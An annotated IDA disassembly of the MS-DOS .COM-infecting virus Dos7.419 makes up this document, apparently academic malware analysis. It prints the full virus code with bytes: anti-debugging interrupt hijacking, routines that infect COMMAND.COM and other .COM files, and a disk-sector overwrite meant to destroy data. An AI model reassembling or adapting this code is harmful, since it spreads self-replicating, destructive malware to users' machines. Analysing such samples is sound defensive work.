seg000:0100                         ;
seg000:0100                         ; +-------------------------------------------------------------------------+
seg000:0100                         ; |      This file was generated by The Interactive Disassembler (IDA)      |
seg000:0100                         ; |           Copyright (c) 2022 Hex-Rays, <support@hex-rays.com>           |
seg000:0100                         ; |                      License info: 48-3051-7114-0E                      |
seg000:0100                         ; |           LSU (Louisiana State University), Academic licenses           |
seg000:0100                         ; +-------------------------------------------------------------------------+
seg000:0100                         ;
seg000:0100                         ; Input SHA256 : 7E00694397CBB7B422CB2F3E39A34C7FB7554931A1A9A2CF9AE7B2BCF42296E3
seg000:0100                         ; Input MD5    : 0B4A318803AA1B9B6A0DCC55CEFCB7CE
seg000:0100                         ; Input CRC32  : 785762D7
seg000:0100
seg000:0100                         ; ---------------------------------------------------------------------------
seg000:0100                         ; File Name   : C:\Users\golden\Desktop\dos7-sample\Virus.DOS.Dos7.419.COM
seg000:0100                         ; Format      : MS-DOS COM-file
seg000:0100                         ; Base Address: 1000h Range: 10100h-102C8h Loaded length: 1C8h
seg000:0100
seg000:0100                                         .8086
seg000:0100                                         .model tiny
seg000:0100
seg000:0100                         ; ===========================================================================
seg000:0100
seg000:0100                         ; Segment type: Pure code
seg000:0100                         seg000          segment byte public 'CODE'
seg000:0100                                         assume cs:seg000
seg000:0100                                         org 100h
seg000:0100                                         assume es:nothing, ss:nothing, ds:seg000
seg000:0100
seg000:0100                                         public start
seg000:0100                         start:
seg000:0100 C7 06 07 01 52 01                       mov     word ptr loc_10106+1, 152h
seg000:0106
seg000:0106                         loc_10106:                              ; DATA XREF: seg000:start↑w
seg000:0106 B8 68 01                                mov     ax, 168h        ; trick with prefetch that will set ax  to 168 if run in live environment but in debug mode it would be 152
seg000:0109 A3 2E 01                                mov     word ptr loc_10129+5, ax
seg000:010C 2B C0                                   sub     ax, ax
seg000:010E 1E                                      push    ds
seg000:010F 8E D8                                   mov     ds, ax
seg000:0111                                         assume ds:nothing
seg000:0111 8E C0                                   mov     es, ax
seg000:0113                                         assume es:nothing
seg000:0113 BE 84 00                                mov     si, 84h         ; interrupt 21
seg000:0116 BF 0C 00                                mov     di, 0Ch
seg000:0119 A5                                      movsw
seg000:011A A5                                      movsw                   ; movsw twice increment si and di by 2 bytes, si = 84 => 86, di = C => E; moving the segment and offset of interrupt 21 to overwrite offset and segment int 3. Every int3 call will actually call int 21
seg000:011B 26 A1 00 00                             mov     ax, es:0        ; saving the segment of division by 0 interrupt
seg000:011F A3 70 01                                mov     ds:170h, ax     ; int 0 offset is saved to ds:170h
seg000:0122 26 A1 02 00                             mov     ax, es:2        ; saving the offset of division by 0 interrupt
seg000:0126 A3 77 01                                mov     ds:177h, ax     ; int 0 segment is saved to ds:177h
seg000:0129
seg000:0129                         loc_10129:                              ; DATA XREF: seg000:0109↑w
seg000:0129 26 C7 06 00 00 4C 4D                    mov     word ptr es:0, 4D4Ch ; save int 0 offset to: debugger? 152. live hardware? 168.
seg000:0130 1F                                      pop     ds              ; ds = 0; beginning of .com file
seg000:0131                                         assume ds:seg000
seg000:0131 8C D8                                   mov     ax, ds
seg000:0133 80 C4 10                                add     ah, 10h
seg000:0136 26 A3 02 00                             mov     es:2, ax
seg000:013A 8E C0                                   mov     es, ax          ; setting int 0  segment to 100h. 100h = beginning of com file execution code which will be the location of where the virus copies itself.
seg000:013C                                         assume es:nothing
seg000:013C BF 00 01                                mov     di, 100h        ; 100h is start offset for .com files
seg000:013F 8B F7                                   mov     si, di          ; 100h is also the start of the vital portion of virus code
seg000:0141 B9 A3 01                                mov     cx, 1A3h        ; 1A3h = size of vital portion of virus code
seg000:0144 F3 A4                                   rep movsb               ; proceed to copy virus code to the top of the com file
seg000:0146 8E D8                                   mov     ds, ax
seg000:0148                                         assume ds:nothing
seg000:0148 F7 F1                                   div     cx              ; triggers int 0, which was overwritten by either 152 if debugging or 168 if in live environment.
seg000:014A
seg000:014A                         loc_1014A:                              ; CODE XREF: seg000:01AB↓j
seg000:014A B4 3E                                   mov     ah, 3Eh ; '>'   ; 3Eh for int21 == close the file
seg000:014C CC                                      int     3               ; Trap to Debugger
seg000:014D
seg000:014D                         loc_1014D:                              ; CODE XREF: seg000:0195↓j
seg000:014D                                                                 ; seg000:01A5↓j
seg000:014D B4 4F                                   mov     ah, 4Fh ; 'O'   ; searches current directory in the current drive for the next matching filename which is .com in this case; requires DTA to be set, which it is.
seg000:014F CC                                      int     3               ; Trap to Debugger
seg000:0150 EB 3A                                   jmp     short loc_1018C
seg000:0152                         ; ---------------------------------------------------------------------------
seg000:0152 2B C9                                   sub     cx, cx
seg000:0154
seg000:0154                         loc_10154:                              ; CODE XREF: seg000:0166↓j
seg000:0154 41                                      inc     cx              ; data destruction routine as punishment for trying to debug the virus.
seg000:0155 0E                                      push    cs
seg000:0156 07                                      pop     es
seg000:0157                                         assume es:seg000
seg000:0157
seg000:0157                         loc_10157:                              ; CODE XREF: seg000:015A↓j
seg000:0157 B8 05 FE                                mov     ax, 0FE05h
seg000:015A EB FC                                   jmp     short near ptr loc_10157+1 ; not really an infinite loop; pressing U on 157 and C on 158 reveals the trickery. Hidden math written on next line.
seg000:015C                         ; ---------------------------------------------------------------------------
seg000:015C 2D 02 E7                                sub     ax, 0E702h      ; ax = 0FE05h + 0EBFE - 0E702 = 10301; 5 bytes but register only holds 4 so 10301 -> 0301 = write 1 sector for int 13h
seg000:015F B7 01                                   mov     bh, 1           ; drive B
seg000:0161 BA 00 00                                mov     dx, 0           ; sector 1
seg000:0164 CD 13                                   int     13h             ; DISK - SET MEDIA TYPE FOR FORMAT (AT model 3x9,XT2,XT286,PS)
seg000:0164                                                                 ; DL = drive number, CH = lower 8 bits of number of tracks, CL = sectors per track
seg000:0166 EB EC                                   jmp     short loc_10154
seg000:0168                         ; ---------------------------------------------------------------------------
seg000:0168 06                                      push    es
seg000:0169 51                                      push    cx
seg000:016A 07                                      pop     es              ; es = cx
seg000:016B                                         assume es:nothing
seg000:016B 26 C7 06 00 00 4C 4D                    mov     word ptr es:0, 4D4Ch ; 4D4Ch was the offset for the beginning of the int 0 executable. Now we are repairing it.
seg000:0172 26 C7 06 02 00 41 53                    mov     word ptr es:2, 5341h ; repairing segment for int 0
seg000:0179 07                                      pop     es
seg000:017A C7 06 07 01 68 01                       mov     word ptr ds:107h, 168h ; Fix the anti-debugger self modifying code
seg000:0180 B4 1A                                   mov     ah, 1Ah         ; disk transfer area set to ds:dx == ds:0000
seg000:0182 99                                      cwd
seg000:0183 CC                                      int     3               ; Trap to Debugger
seg000:0184 B4 4E                                   mov     ah, 4Eh ; 'N'   ; find matching *.com files
seg000:0186 2B C9                                   sub     cx, cx          ; this will set carry flag if no file was found
seg000:0188 BA 23 02                                mov     dx, 223h        ; address for the description of the .com files
seg000:018B CC                                      int     3               ; Trap to Debugger
seg000:018C
seg000:018C                         loc_1018C:                              ; CODE XREF: seg000:0150↑j
seg000:018C 72 7E                                   jb      short loc_1020C ; jump if carry was set which means no file was found
seg000:018E B8 02 3D                                mov     ax, 3D02h       ; 3D02 == int 21 == interrupt for opening the file
seg000:0191 BA 1E 00                                mov     dx, 1Eh         ; first usable block of memory == file name
seg000:0194 CC                                      int     3               ; open the file
seg000:0195 72 B6                                   jb      short loc_1014D ; if nothing is found, we go to the function that performs a search for the next one
seg000:0197 8B D8                                   mov     bx, ax
seg000:0199 B4 3F                                   mov     ah, 3Fh ; '?'   ; 3Fh == read this file for int 21
seg000:019B BF 1A 00                                mov     di, 1Ah         ; 1Ah == disk transfer address
seg000:019E 8B 0D                                   mov     cx, [di]
seg000:01A0 8B D6                                   mov     dx, si          ; destination of .com file, read it
seg000:01A2 CC                                      int     3               ; read the file
seg000:01A3 8B 04                                   mov     ax, [si]
seg000:01A5 72 A6                                   jb      short loc_1014D ; go to search function
seg000:01A7 3B 06 00 01                             cmp     ax, ds:100h     ; compare start of .com file with virus code
seg000:01AB 74 9D                                   jz      short loc_1014A ; if its the same, we just jump to function that closes the file. Already infected.
seg000:01AD 8B 44 02                                mov     ax, [si+2]      ; grab 3rd and 4th byte to see what type of .com file we are dealing with
seg000:01B0 3D 15 60                                cmp     ax, 6015h       ; 60 15 is the 3rd and 4th byte of the command.com file
seg000:01B3 74 02                                   jz      short loc_101B7 ; jumps to command.com file infection if ax == 6015
seg000:01B5 EB 3F                                   jmp     short loc_101F6 ; otherwise jump to normal .com file infection
seg000:01B7                         ; ---------------------------------------------------------------------------
seg000:01B7
seg000:01B7                         loc_101B7:                              ; CODE XREF: seg000:01B3↑j
seg000:01B7 57                                      push    di
seg000:01B8 56                                      push    si              ; save di and si for later use
seg000:01B9 BE 4D 02                                mov     si, 24Dh        ; location of the string that the virus wants to overwrite the copywrite string with
seg000:01BC BF F0 23                                mov     di, 23F0h       ; 23F0 - 2A3 == location of copyright string (Microsoft(R) MS-DOS(R) Version....)
seg000:01BF B9 55 00                                mov     cx, 55h ; 'U'   ; copy 85 bits
seg000:01C2 90                                      nop                     ; no operation
seg000:01C3 FC                                      cld                     ; clear flag
seg000:01C4 F3 A4                                   rep movsb               ; copy operation to overwrite the string in the command.com file
seg000:01C6 BE 2A 02                                mov     si, 22Ah        ; infection string that overwrites. "is infected!..."
seg000:01C9 BF 57 90                                mov     di, 9057h       ; 9057 - 2Ah == location of "has no label..." string to overwrite.
seg000:01CC B9 0C 00                                mov     cx, 0Ch         ; 12 bits to copy
seg000:01CF 90                                      nop
seg000:01D0 F3 A4                                   rep movsb               ; copy operation
seg000:01D2 BE 36 02                                mov     si, 236h
seg000:01D5 BF 4C 91                                mov     di, 914Ch       ; 914C - 2A3 = 8EA9 == offset of the next string to overwrite
seg000:01D8 B9 17 00                                mov     cx, 17h         ; 23 bits to copy
seg000:01DB 90                                      nop
seg000:01DC F3 A4                                   rep movsb
seg000:01DE B8 00 42                                mov     ax, 4200h       ; move file pointer to the beginning
seg000:01E1 2B D2                                   sub     dx, dx
seg000:01E3 8B CA                                   mov     cx, dx
seg000:01E5 CC                                      int     3               ; Trap to Debugger
seg000:01E6 B4 40                                   mov     ah, 40h ; '@'   ; 40h == write cx number of bytes to the opened file
seg000:01E8 BA A3 02                                mov     dx, 2A3h        ; from offset 2A3h
seg000:01EB B9 BD CE                                mov     cx, 0CEBDh      ; read 0CEBD bytes
seg000:01EE CC                                      int     3               ; Trap to Debugger
seg000:01EF B4 3E                                   mov     ah, 3Eh ; '>'   ; close this file
seg000:01F1 CC                                      int     3               ; Trap to Debugger
seg000:01F2 5E                                      pop     si
seg000:01F3 5F                                      pop     di              ; restore si and di
seg000:01F4 EB 16                                   jmp     short loc_1020C ; go get the next .com file
seg000:01F6                         ; ---------------------------------------------------------------------------
seg000:01F6
seg000:01F6                         loc_101F6:                              ; CODE XREF: seg000:01B5↑j
seg000:01F6 B8 00 42                                mov     ax, 4200h
seg000:01F9 2B D2                                   sub     dx, dx          ; dx = 0
seg000:01FB 8B CA                                   mov     cx, dx          ; cx = 0
seg000:01FD CC                                      int     3               ; Trap to Debugger
seg000:01FE FE C6                                   inc     dh              ; dh:dl == 01:00
seg000:0200 B4 40                                   mov     ah, 40h ; '@'   ; write to the beginning of this file the virus code
seg000:0202 8B 0D                                   mov     cx, [di]
seg000:0204 81 C1 A3 01                             add     cx, 1A3h        ; remember that 1A3h is the size of the crucial portion of the virus code.
seg000:0208 CC                                      int     3               ; Trap to Debugger
seg000:0209 B4 3E                                   mov     ah, 3Eh ; '>'   ; close this file
seg000:020B CC                                      int     3               ; Trap to Debugger
seg000:020C
seg000:020C                         loc_1020C:                              ; CODE XREF: seg000:loc_1018C↑j
seg000:020C                                                                 ; seg000:01F4↑j
seg000:020C 8C D0                                   mov     ax, ss          ; save stack location to ax
seg000:020E 8E C0                                   mov     es, ax          ; also save it to es
seg000:0210 8E D8                                   mov     ds, ax          ; and save it to data segment for current use
seg000:0212                                         assume ds:seg000
seg000:0212 50                                      push    ax              ; pushing seg and offset of the code for the retf at 0:0222
seg000:0213 B4 1A                                   mov     ah, 1Ah         ; set DTA; find the first file
seg000:0215 D1 EA                                   shr     dx, 1           ; restores original content of DTA
seg000:0217 CC                                      int     3               ; Trap to Debugger
seg000:0218 BF 00 01                                mov     di, 100h        ; go to the beginning of the found .com file
seg000:021B 57                                      push    di              ; push its location to the top of the stack
seg000:021C 8B CC                                   mov     cx, sp
seg000:021E 2B CE                                   sub     cx, si          ; calculate the size of the current .com file by subtracting where we jumped from, from the total size of the stack.
seg000:0220 F3 A4                                   rep movsb               ; initiate copy operation
seg000:0222 CB                                      retf                    ; return
seg000:0222                         ; ---------------------------------------------------------------------------
seg000:0223 2A                                      db  2Ah ; *
seg000:0224 57                                      db  57h ; W
seg000:0225 2E                                      db  2Eh ; .
seg000:0226 43                                      db  43h ; C
seg000:0227 3F                                      db  3Fh ; ?
seg000:0228 4D                                      db  4Dh ; M
seg000:0229 00                                      db    0
seg000:022A 69                                      db  69h ; i
seg000:022B 73                                      db  73h ; s
seg000:022C 20                                      db  20h
seg000:022D 69                                      db  69h ; i
seg000:022E 6E                                      db  6Eh ; n
seg000:022F 66                                      db  66h ; f
seg000:0230 65                                      db  65h ; e
seg000:0231 63                                      db  63h ; c
seg000:0232 74                                      db  74h ; t
seg000:0233 65                                      db  65h ; e
seg000:0234 64                                      db  64h ; d
seg000:0235 21                                      db  21h ; !
seg000:0236 6F                                      db  6Fh ; o
seg000:0237 79                                      db  79h ; y
seg000:0238 2C                                      db  2Ch ; ,
seg000:0239 20                                      db  20h
seg000:023A 61                                      db  61h ; a
seg000:023B 72                                      db  72h ; r
seg000:023C 65                                      db  65h ; e
seg000:023D 20                                      db  20h
seg000:023E 79                                      db  79h ; y
seg000:023F 6F                                      db  6Fh ; o
seg000:0240 75                                      db  75h ; u
seg000:0241 20                                      db  20h
seg000:0242 65                                      db  65h ; e
seg000:0243 76                                      db  76h ; v
seg000:0244 65                                      db  65h ; e
seg000:0245 72                                      db  72h ; r
seg000:0246 20                                      db  20h
seg000:0247 64                                      db  64h ; d
seg000:0248 75                                      db  75h ; u
seg000:0249 6D                                      db  6Dh ; m
seg000:024A 62                                      db  62h ; b
seg000:024B 21                                      db  21h ; !
seg000:024C 20                                      db  20h
seg000:024D 4D                                      db  4Dh ; M
seg000:024E 53                                      db  53h ; S
seg000:024F 44                                      db  44h ; D
seg000:0250 4F                                      db  4Fh ; O
seg000:0251 53                                      db  53h ; S
seg000:0252 20                                      db  20h
seg000:0253 37                                      db  37h ; 7
seg000:0254 20                                      db  20h
seg000:0255 28                                      db  28h ; (
seg000:0256 43                                      db  43h ; C
seg000:0257 29                                      db  29h ; )
seg000:0258 31                                      db  31h ; 1
seg000:0259 39                                      db  39h ; 9
seg000:025A 39                                      db  39h ; 9
seg000:025B 33                                      db  33h ; 3
seg000:025C 20                                      db  20h
seg000:025D 41                                      db  41h ; A
seg000:025E 4E                                      db  4Eh ; N
seg000:025F 41                                      db  41h ; A
seg000:0260 52                                      db  52h ; R
seg000:0261 4B                                      db  4Bh ; K
seg000:0262 49                                      db  49h ; I
seg000:0263 43                                      db  43h ; C
seg000:0264 4B                                      db  4Bh ; K
seg000:0265 20                                      db  20h
seg000:0266 53                                      db  53h ; S
seg000:0267 59                                      db  59h ; Y
seg000:0268 53                                      db  53h ; S
seg000:0269 54                                      db  54h ; T
seg000:026A 45                                      db  45h ; E
seg000:026B 4D                                      db  4Dh ; M
seg000:026C 53                                      db  53h ; S
seg000:026D 0D                                      db  0Dh
seg000:026E 0A                                      db  0Ah
seg000:026F 01                                      db    1
seg000:0270 01                                      db    1
seg000:0271 01                                      db    1
seg000:0272 20                                      db  20h
seg000:0273 20                                      db  20h
seg000:0274 20                                      db  20h
seg000:0275 20                                      db  20h
seg000:0276 20                                      db  20h
seg000:0277 44                                      db  44h ; D
seg000:0278 4F                                      db  4Fh ; O
seg000:0279 53                                      db  53h ; S
seg000:027A 20                                      db  20h
seg000:027B 36                                      db  36h ; 6
seg000:027C 20                                      db  20h
seg000:027D 41                                      db  41h ; A
seg000:027E 6E                                      db  6Eh ; n
seg000:027F 74                                      db  74h ; t
seg000:0280 69                                      db  69h ; i
seg000:0281 76                                      db  76h ; v
seg000:0282 69                                      db  69h ; i
seg000:0283 72                                      db  72h ; r
seg000:0284 75                                      db  75h ; u
seg000:0285 73                                      db  73h ; s
seg000:0286 20                                      db  20h
seg000:0287 73                                      db  73h ; s
seg000:0288 75                                      db  75h ; u
seg000:0289 63                                      db  63h ; c
seg000:028A 6B                                      db  6Bh ; k
seg000:028B 73                                      db  73h ; s
seg000:028C 2E                                      db  2Eh ; .
seg000:028D 20                                      db  20h
seg000:028E 49                                      db  49h ; I
seg000:028F 74                                      db  74h ; t
seg000:0290 20                                      db  20h
seg000:0291 6D                                      db  6Dh ; m
seg000:0292 69                                      db  69h ; i
seg000:0293 73                                      db  73h ; s
seg000:0294 73                                      db  73h ; s
seg000:0295 65                                      db  65h ; e
seg000:0296 64                                      db  64h ; d
seg000:0297 20                                      db  20h
seg000:0298 74                                      db  74h ; t
seg000:0299 68                                      db  68h ; h
seg000:029A 69                                      db  69h ; i
seg000:029B 73                                      db  73h ; s
seg000:029C 20                                      db  20h
seg000:029D 6F                                      db  6Fh ; o
seg000:029E 6E                                      db  6Eh ; n
seg000:029F 65                                      db  65h ; e
seg000:02A0 21                                      db  21h ; !
seg000:02A1 20                                      db  20h
seg000:02A2 24                                      db  24h ; $
seg000:02A3                         ; ---------------------------------------------------------------------------
seg000:02A3 B4 09                                   mov     ah, 9
seg000:02A5 BA 09 01                                mov     dx, 109h        ; Displays demonic message, this only occurs when you try to run the virus as a standalone .com file
seg000:02A8 CC                                      int     3               ; Trap to Debugger
seg000:02A9 B4 4C                                   mov     ah, 4Ch ; 'L'   ; terminate this program
seg000:02AB CC                                      int     3               ; Trap to Debugger
seg000:02AB                         ; ---------------------------------------------------------------------------
seg000:02AC 5B                                      db  5Bh ; [
seg000:02AD 44                                      db  44h ; D
seg000:02AE 4F                                      db  4Fh ; O
seg000:02AF 53                                      db  53h ; S
seg000:02B0 20                                      db  20h
seg000:02B1 37                                      db  37h ; 7
seg000:02B2 76                                      db  76h ; v
seg000:02B3 01                                      db    1
seg000:02B4 01                                      db    1
seg000:02B5 01                                      db    1
seg000:02B6 5D                                      db  5Dh ; ]
seg000:02B7 20                                      db  20h
seg000:02B8 4C                                      db  4Ch ; L
seg000:02B9 75                                      db  75h ; u
seg000:02BA 63                                      db  63h ; c
seg000:02BB 69                                      db  69h ; i
seg000:02BC 66                                      db  66h ; f
seg000:02BD 65                                      db  65h ; e
seg000:02BE 72                                      db  72h ; r
seg000:02BF 20                                      db  20h
seg000:02C0 4D                                      db  4Dh ; M
seg000:02C1 65                                      db  65h ; e
seg000:02C2 73                                      db  73h ; s
seg000:02C3 73                                      db  73h ; s
seg000:02C4 69                                      db  69h ; i
seg000:02C5 61                                      db  61h ; a
seg000:02C6 68                                      db  68h ; h
seg000:02C7 24                                      db  24h ; $
seg000:02C7                         seg000          ends
seg000:02C7
seg000:02C7
seg000:02C7                                         end start
